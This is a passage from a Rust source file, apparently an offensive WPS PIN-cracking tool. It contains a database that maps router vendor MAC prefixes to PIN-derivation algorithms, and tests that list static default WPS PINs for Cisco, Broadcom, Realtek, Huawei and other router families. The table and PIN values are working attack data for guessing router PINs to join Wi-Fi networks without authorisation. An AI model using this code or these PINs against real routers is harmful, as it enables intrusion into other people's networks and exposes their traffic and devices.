    OuiEntry { prefix: "181E78", algo: PinAlgo::Asus },
    OuiEntry { prefix: "1C4419", algo: PinAlgo::Asus },
    OuiEntry { prefix: "2420C7", algo: PinAlgo::Asus },
    OuiEntry { prefix: "247F20", algo: PinAlgo::Asus },
    OuiEntry { prefix: "2CAB25", algo: PinAlgo::Asus },
    OuiEntry { prefix: "3085A98C", algo: PinAlgo::Asus },
    OuiEntry { prefix: "3C1E04", algo: PinAlgo::Asus },
    OuiEntry { prefix: "40F201", algo: PinAlgo::Asus },
    OuiEntry { prefix: "44E9DD", algo: PinAlgo::Asus },
    OuiEntry { prefix: "48EE0C", algo: PinAlgo::Asus },
    OuiEntry { prefix: "5464D9", algo: PinAlgo::Asus },
    OuiEntry { prefix: "54B80A", algo: PinAlgo::Asus },
    OuiEntry { prefix: "587BE906", algo: PinAlgo::Asus },
    OuiEntry { prefix: "60D1AA21", algo: PinAlgo::Asus },
    OuiEntry { prefix: "64517E", algo: PinAlgo::Asus },
    OuiEntry { prefix: "64D954", algo: PinAlgo::Asus },
    OuiEntry { prefix: "6C198F", algo: PinAlgo::Asus },
    OuiEntry { prefix: "6C7220", algo: PinAlgo::Asus },
    OuiEntry { prefix: "6CFDB9", algo: PinAlgo::Asus },
    OuiEntry { prefix: "78D99FD", algo: PinAlgo::Asus },
    OuiEntry { prefix: "7C2664", algo: PinAlgo::Asus },
    OuiEntry { prefix: "803F5DF6", algo: PinAlgo::Asus },
    OuiEntry { prefix: "84A423", algo: PinAlgo::Asus },
    OuiEntry { prefix: "88A6C6", algo: PinAlgo::Asus },
    OuiEntry { prefix: "8C10D4", algo: PinAlgo::Asus },
    OuiEntry { prefix: "8C882B00", algo: PinAlgo::Asus },
    OuiEntry { prefix: "904D4A", algo: PinAlgo::Asus },
    OuiEntry { prefix: "907282", algo: PinAlgo::Asus },
    OuiEntry { prefix: "90F65290", algo: PinAlgo::Asus },
    OuiEntry { prefix: "94FBB2", algo: PinAlgo::Asus },
    OuiEntry { prefix: "A01B29", algo: PinAlgo::Asus },
    OuiEntry { prefix: "A0F3C1E", algo: PinAlgo::Asus },
    OuiEntry { prefix: "A8F7E00", algo: PinAlgo::Asus },
    OuiEntry { prefix: "ACA213", algo: PinAlgo::Asus },
    OuiEntry { prefix: "B85510", algo: PinAlgo::Asus },
    OuiEntry { prefix: "B8EE0E", algo: PinAlgo::Asus },
    OuiEntry { prefix: "BC3400", algo: PinAlgo::Asus },
    OuiEntry { prefix: "BC9680", algo: PinAlgo::Asus },
    OuiEntry { prefix: "C891F9", algo: PinAlgo::Asus },
    OuiEntry { prefix: "D00ED90", algo: PinAlgo::Asus },
    OuiEntry { prefix: "D084B0", algo: PinAlgo::Asus },
    OuiEntry { prefix: "D8FEE3", algo: PinAlgo::Asus },
    OuiEntry { prefix: "E4BEED", algo: PinAlgo::Asus },
    OuiEntry { prefix: "E894F6F6", algo: PinAlgo::Asus },
    OuiEntry { prefix: "EC1A5971", algo: PinAlgo::Asus },
    OuiEntry { prefix: "EC4C4D", algo: PinAlgo::Asus },
    OuiEntry { prefix: "F42853", algo: PinAlgo::Asus },
    OuiEntry { prefix: "F43E61", algo: PinAlgo::Asus },
    OuiEntry { prefix: "F46BEF", algo: PinAlgo::Asus },
    OuiEntry { prefix: "F8AB05", algo: PinAlgo::Asus },
    OuiEntry { prefix: "FC8B97", algo: PinAlgo::Asus },
    OuiEntry { prefix: "7062B8", algo: PinAlgo::Asus },
    OuiEntry { prefix: "78542E", algo: PinAlgo::Asus },
    OuiEntry { prefix: "C0A0BB8C", algo: PinAlgo::Asus },
    OuiEntry { prefix: "C412F5", algo: PinAlgo::Asus },
    OuiEntry { prefix: "C4A81D", algo: PinAlgo::Asus },
    OuiEntry { prefix: "E8CC18", algo: PinAlgo::Asus },
    OuiEntry { prefix: "EC2280", algo: PinAlgo::Asus },
    OuiEntry { prefix: "F8E903F4", algo: PinAlgo::Asus },
    OuiEntry { prefix: "7C10C9", algo: PinAlgo::Asus },

    // ── pinAirocon ──
    OuiEntry { prefix: "0007262F", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "000B2B4A", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "000EF4E7", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "001333B", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "00177C", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "001AEF", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "00E04BB3", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "02101801", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "0810734", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "08107710", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "1013EE0", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "2CAB25C7", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "788C54", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "803F5DF6", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "94FBB2", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "BC9680", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "F43E61", algo: PinAlgo::Airocon },
    OuiEntry { prefix: "FC8B97", algo: PinAlgo::Airocon },

    // ── pinEmpty (Null PIN) — these OUIs are known to accept empty/zero PINs ──
    // (included in DB for completeness but NullPin is always tried in Auto mode anyway)

    // ── Static PINs: Cisco ──
    OuiEntry { prefix: "001A2B", algo: PinAlgo::Cisco },
    OuiEntry { prefix: "00248C", algo: PinAlgo::Cisco },
    OuiEntry { prefix: "002618", algo: PinAlgo::Cisco },
    OuiEntry { prefix: "344DEB", algo: PinAlgo::Cisco },
    OuiEntry { prefix: "7071BC", algo: PinAlgo::Cisco },
    OuiEntry { prefix: "E06995", algo: PinAlgo::Cisco },
    OuiEntry { prefix: "E0CB4E", algo: PinAlgo::Cisco },
    OuiEntry { prefix: "7054F5", algo: PinAlgo::Cisco },

    // ── Static PINs: Broadcom ──
    OuiEntry { prefix: "ACF1DF", algo: PinAlgo::Brcm1 },
    OuiEntry { prefix: "BCF685", algo: PinAlgo::Brcm1 },
    OuiEntry { prefix: "C8D3A3", algo: PinAlgo::Brcm1 },
    OuiEntry { prefix: "988B5D", algo: PinAlgo::Brcm1 },
    OuiEntry { prefix: "001AA9", algo: PinAlgo::Brcm1 },
    OuiEntry { prefix: "14144B", algo: PinAlgo::Brcm1 },
    OuiEntry { prefix: "EC6264", algo: PinAlgo::Brcm1 },

    OuiEntry { prefix: "14D64D", algo: PinAlgo::Brcm2 },
    OuiEntry { prefix: "1C7EE5", algo: PinAlgo::Brcm2 },
    OuiEntry { prefix: "28107B", algo: PinAlgo::Brcm2 },
    OuiEntry { prefix: "84C9B2", algo: PinAlgo::Brcm2 },
    OuiEntry { prefix: "B8A386", algo: PinAlgo::Brcm2 },
    OuiEntry { prefix: "BCF685", algo: PinAlgo::Brcm2 },
    OuiEntry { prefix: "C8BE19", algo: PinAlgo::Brcm2 },

    OuiEntry { prefix: "14D64D", algo: PinAlgo::Brcm3 },
    OuiEntry { prefix: "1C7EE5", algo: PinAlgo::Brcm3 },
    OuiEntry { prefix: "28107B", algo: PinAlgo::Brcm3 },
    OuiEntry { prefix: "B8A386", algo: PinAlgo::Brcm3 },
    OuiEntry { prefix: "BCF685", algo: PinAlgo::Brcm3 },
    OuiEntry { prefix: "C8BE19", algo: PinAlgo::Brcm3 },
    OuiEntry { prefix: "7C034C", algo: PinAlgo::Brcm3 },

    OuiEntry { prefix: "14D64D", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "1C7EE5", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "28107B", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "84C9B2", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "B8A386", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "BCF685", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "C8BE19", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "C8D3A3", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "CCB255", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "FC7516", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "204E7F", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "4C17EB", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "18622C", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "7C03D8", algo: PinAlgo::Brcm4 },
    OuiEntry { prefix: "D86CE9", algo: PinAlgo::Brcm4 },

    OuiEntry { prefix: "14D64D", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "1C7EE5", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "28107B", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "84C9B2", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "B8A386", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "BCF685", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "C8BE19", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "C8D3A3", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "CCB255", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "FC7516", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "204E7F", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "4C17EB", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "18622C", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "7C03D8", algo: PinAlgo::Brcm5 },
    OuiEntry { prefix: "D86CE9", algo: PinAlgo::Brcm5 },

    OuiEntry { prefix: "14D64D", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "1C7EE5", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "28107B", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "84C9B2", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "B8A386", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "BCF685", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "C8BE19", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "C8D3A3", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "CCB255", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "FC7516", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "204E7F", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "4C17EB", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "18622C", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "7C03D8", algo: PinAlgo::Brcm6 },
    OuiEntry { prefix: "D86CE9", algo: PinAlgo::Brcm6 },

    // ── Static PINs: Airocon statics ──
    OuiEntry { prefix: "181E78", algo: PinAlgo::Airc1 },
    OuiEntry { prefix: "40F201", algo: PinAlgo::Airc1 },
    OuiEntry { prefix: "44E9DD", algo: PinAlgo::Airc1 },
    OuiEntry { prefix: "D084B0", algo: PinAlgo::Airc1 },

    OuiEntry { prefix: "84A423", algo: PinAlgo::Airc2 },
    OuiEntry { prefix: "8C10D4", algo: PinAlgo::Airc2 },
    OuiEntry { prefix: "88A6C6", algo: PinAlgo::Airc2 },

    // ── Static PINs: DSL-2740R ──
    OuiEntry { prefix: "00265A", algo: PinAlgo::Dsl2740r },
    OuiEntry { prefix: "1CBDB9", algo: PinAlgo::Dsl2740r },
    OuiEntry { prefix: "340804", algo: PinAlgo::Dsl2740r },
    OuiEntry { prefix: "5CD998", algo: PinAlgo::Dsl2740r },
    OuiEntry { prefix: "84C9B2", algo: PinAlgo::Dsl2740r },
    OuiEntry { prefix: "FC7516", algo: PinAlgo::Dsl2740r },

    // ── Static PINs: Realtek ──
    OuiEntry { prefix: "0014D1", algo: PinAlgo::Realtek1 },
    OuiEntry { prefix: "000C42", algo: PinAlgo::Realtek1 },
    OuiEntry { prefix: "000EE8", algo: PinAlgo::Realtek1 },

    OuiEntry { prefix: "007263", algo: PinAlgo::Realtek2 },
    OuiEntry { prefix: "E4BEED", algo: PinAlgo::Realtek2 },

    OuiEntry { prefix: "08C6B3", algo: PinAlgo::Realtek3 },

    // ── Static PINs: Upvel ──
    OuiEntry { prefix: "784476", algo: PinAlgo::Upvel },
    OuiEntry { prefix: "D4BF7F0", algo: PinAlgo::Upvel },
    OuiEntry { prefix: "F8C091", algo: PinAlgo::Upvel },

    // ── Static PINs: UR-814AC / UR-825AC ──
    OuiEntry { prefix: "D4BF7F60", algo: PinAlgo::Ur814ac },
    OuiEntry { prefix: "D4BF7F5", algo: PinAlgo::Ur825ac },

    // ── Static PINs: Onlime ──
    OuiEntry { prefix: "D4BF7F", algo: PinAlgo::Onlime },
    OuiEntry { prefix: "F8C091", algo: PinAlgo::Onlime },
    OuiEntry { prefix: "144D67", algo: PinAlgo::Onlime },
    OuiEntry { prefix: "784476", algo: PinAlgo::Onlime },
    OuiEntry { prefix: "0014D1", algo: PinAlgo::Onlime },

    // ── Static PINs: Edimax ──
    OuiEntry { prefix: "801F02", algo: PinAlgo::Edimax },
    OuiEntry { prefix: "00E04C", algo: PinAlgo::Edimax },

    // ── Static PINs: Thomson ──
    OuiEntry { prefix: "002624", algo: PinAlgo::Thomson },
    OuiEntry { prefix: "4432C8", algo: PinAlgo::Thomson },
    OuiEntry { prefix: "88F7C7", algo: PinAlgo::Thomson },
    OuiEntry { prefix: "CC03FA", algo: PinAlgo::Thomson },

    // ── Static PINs: HG532x ──
    OuiEntry { prefix: "00664B", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "086361", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "087A4C", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "0C96BF", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "14B968", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "2008ED", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "2469A5", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "346BD3", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "786A89", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "88E3AB", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "9CC172", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "ACE215", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "D07AB5", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "CCA223", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "E8CD2D", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "F80113", algo: PinAlgo::Hg532x },
    OuiEntry { prefix: "F83DFF", algo: PinAlgo::Hg532x },

    // ── Static PINs: H108L ──
    OuiEntry { prefix: "4C09B4", algo: PinAlgo::H108l },
    OuiEntry { prefix: "4CAC0A", algo: PinAlgo::H108l },
    OuiEntry { prefix: "84742A4", algo: PinAlgo::H108l },
    OuiEntry { prefix: "9CD24B", algo: PinAlgo::H108l },
    OuiEntry { prefix: "B075D5", algo: PinAlgo::H108l },
    OuiEntry { prefix: "C864C7", algo: PinAlgo::H108l },
    OuiEntry { prefix: "DC028E", algo: PinAlgo::H108l },
    OuiEntry { prefix: "FCC897", algo: PinAlgo::H108l },

    // ── Static PINs: CBN/ONO ──
    OuiEntry { prefix: "5C353B", algo: PinAlgo::Ono },
    OuiEntry { prefix: "DC537C", algo: PinAlgo::Ono },
];

// ═══════════════════════════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    fn mac(bytes: [u8; 6]) -> MacAddress {
        MacAddress::new(bytes)
    }

    #[test]
    fn test_pin24() {
        // MAC C83A35:112233 → NIC = 0x112233 = 1122867
        // pin24 = 1122867 % 10000000 = 1122867
        // checksum of 1122867 = ?
        assert_eq!(compute_pin24(0xC83A35112233), 1122867 % 10_000_000);
    }

    #[test]
    fn test_pin28() {
        // MAC 200BC7:AABBCC → lower 28 bits = 0x7AABBCC
        let mac = 0x200BC7AABBCC_u64;
        assert_eq!(compute_pin28(mac), (mac & 0xFFFFFFF) as u32 % 10_000_000);
    }

    #[test]
    fn test_pin32() {
        // MAC 000726:AABBCC → lower 32 bits = 0x26AABBCC
        let mac = 0x000726AABBCC_u64;
        assert_eq!(compute_pin32(mac), (mac & 0xFFFFFFFF) as u32 % 10_000_000);
    }

    #[test]
    fn test_dlink_basic() {
        // D-Link: NIC XOR 0x55AA55, then nibble shifting
        let pin = compute_dlink(0x14D64D_AABBCC);
        // Just verify it's in valid 7-digit range
        assert!(pin < 10_000_000);
        assert!(pin >= 1_000_000); // D-Link algo ensures >= 1M
    }

    #[test]
    fn test_airocon() {
        let b = [0x78, 0x8C, 0x54, 0x11, 0x22, 0x33];
        let pin = compute_airocon(&b);
        // Verify each digit is a sum of adjacent bytes mod 10
        let d6 = (0x78 + 0x8C) % 10; // = 260 % 10 = 0
        let d5 = (0x8C + 0x54) % 10; // = 224 % 10 = 4
        let d4 = (0x54 + 0x11) % 10; // = 101 % 10 = 1
        let d3 = (0x11 + 0x22) % 10; // = 51 % 10 = 1
        let d2 = (0x22 + 0x33) % 10; // = 85 % 10 = 5
        let d1 = (0x33 + 0x78) % 10; // = 171 % 10 = 1
        let d0 = (0x78 + 0x8C) % 10; // = 260 % 10 = 0
        let expected = d6 * 1_000_000 + d5 * 100_000 + d4 * 10_000 + d3 * 1_000 + d2 * 100 + d1 * 10 + d0;
        assert_eq!(pin, expected);
    }

    #[test]
    fn test_easybox() {
        // Verify EasyBox returns Some for valid MAC
        let b = [0x38, 0x22, 0x9D, 0x11, 0x22, 0x33];
        let pin = compute_easybox(&b);
        assert!(pin.is_some());
        assert!(pin.unwrap() < 10_000_000);
    }

    #[test]
    fn test_belkin_needs_serial() {
        let b = [0xEC, 0x22, 0x80, 0x11, 0x22, 0x33];
        // No serial → None
        assert!(compute_belkin(&b, "").is_none());
        // With serial → Some
        assert!(compute_belkin(&b, "A1234B5678").is_some());
    }

    #[test]
    fn test_asus_basic() {
        let b = [0x04, 0x92, 0x26, 0x11, 0x22, 0x33];
        let pin = compute_asus(&b);
        assert!(pin.is_some());
        assert!(pin.unwrap() < 10_000_000);
    }

    #[test]
    fn test_static_pin_cisco() {
        // Cisco OUI: static 7-digit = 1234567, checksum = 8 → full PIN = 12345678
        let m = mac([0x00, 0x1A, 0x2B, 0xAA, 0xBB, 0xCC]);
        let candidates = generate_pins(&m, None);
        assert!(candidates.iter().any(|c| c.pin == "12345678"),
            "Expected Cisco PIN 12345678, got: {:?}", candidates.iter().map(|c| &c.pin).collect::<Vec<_>>());
    }

    #[test]
    fn test_generate_pins_unknown_oui() {
        // Unknown OUIs now get fallback generic algorithms (pin24, pin28, pin32)
        let m = mac([0xFF, 0xFF, 0xFF, 0x11, 0x22, 0x33]);
        let candidates = generate_pins(&m, None);
        assert!(!candidates.is_empty(), "fallback should produce pin24/28/32 candidates");
        assert!(candidates.len() <= 3);
        // All should be low confidence (30)
        for c in &candidates {
            assert_eq!(c.confidence, 30);
        }
    }

    #[test]
    fn test_generate_pins_dedup() {
        // An OUI that matches multiple algorithms producing the same PIN should dedup
        let m = mac([0x14, 0xD6, 0x4D, 0x00, 0x00, 0x01]);
        let candidates = generate_pins(&m, None);
        let pins: Vec<&str> = candidates.iter().map(|c| c.pin.as_str()).collect();
        let unique: std::collections::HashSet<&str> = pins.iter().copied().collect();
        assert_eq!(pins.len(), unique.len(), "PINs should be deduplicated");
    }

    #[test]
    fn test_all_static_pins_have_valid_checksum() {
        let statics = [
            (1234567u32, "Cisco"),
            (2017252, "Brcm1"),
            (4626484, "Brcm2"),
            (7622990, "Brcm3"),
            (6232714, "Brcm4"),
            (1086411, "Brcm5"),
            (3195719, "Brcm6"),
            (3043203, "Airc1"),
            (7141225, "Airc2"),
            (6817554, "DSL2740R"),
            (9566146, "Realtek1"),
            (9571911, "Realtek2"),
            (4856371, "Realtek3"),
            (2085483, "Upvel"),
            (4397768, "UR814AC"),
            (529417, "UR825AC"),
            (9995604, "Onlime"),
            (3561153, "Edimax"),
            (6795814, "Thomson"),
            (3425928, "HG532x"),
            (9422988, "H108L"),
            (9575521, "ONO"),
        ];
        for (pin7, name) in statics {
            let chk = wps_pin_checksum(pin7);
            let pin8 = pin7 * 10 + chk as u32;
            let pin_str = format!("{:08}", pin8);
            assert_eq!(pin_str.len(), 8, "Static PIN {} ({}) should be 8 digits", name, pin8);
            // Verify the checksum is valid using the protocol module's validator
            assert!(crate::protocol::wps::wps_pin_valid(pin8),
                "Static PIN {} ({}) should have valid checksum", name, pin8);
        }
    }

    #[test]
    fn test_pin_checksum_known_values() {
        // 12345678: checksum of 1234567 is 8 (per WSC spec Luhn variant)
        assert_eq!(wps_pin_checksum(1234567), 8);
        // 00000000: checksum of 0000000 should be 0
        assert_eq!(wps_pin_checksum(0), 0);
    }

    #[test]
    fn test_multiple_algorithms_match() {
        // MAC 14D64D matches: pin24, DLink, DLink1, Brcm2-6, Asus
        let m = mac([0x14, 0xD6, 0x4D, 0x11, 0x22, 0x33]);
        let candidates = generate_pins(&m, None);
        assert!(candidates.len() >= 3, "Should match multiple algorithms, got {}", candidates.len());
    }
}
